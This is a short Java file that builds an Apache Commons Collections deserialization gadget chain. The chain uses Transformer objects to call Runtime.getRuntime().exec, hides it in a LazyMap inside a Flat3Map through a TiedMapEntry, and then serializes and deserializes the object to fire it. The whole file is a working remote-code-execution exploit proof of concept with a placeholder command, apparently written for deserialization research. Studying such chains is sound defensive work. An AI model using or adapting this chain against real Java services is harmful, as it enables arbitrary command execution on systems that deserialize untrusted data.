package cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.Flat3Map;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

public class Flat3Map_equals {
    public static void main(String[] args) throws Exception {
        Flat3Map flat3Map = new Flat3Map();
        Transformer[] transformers =  new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"www"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map lazymap = LazyMap.decorate(new HashMap(), new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "abc");
        flat3Map.put(tiedMapEntry, 1);
        lazymap.remove("abc");
        SerializableTest.setFieldValue(lazymap, "factory", chainedTransformer);
        SerializableTest.searilze(flat3Map,"Flat3Map_equals.bin");
        SerializableTest.unzearilze("Flat3Map_equals.bin");
    }
}
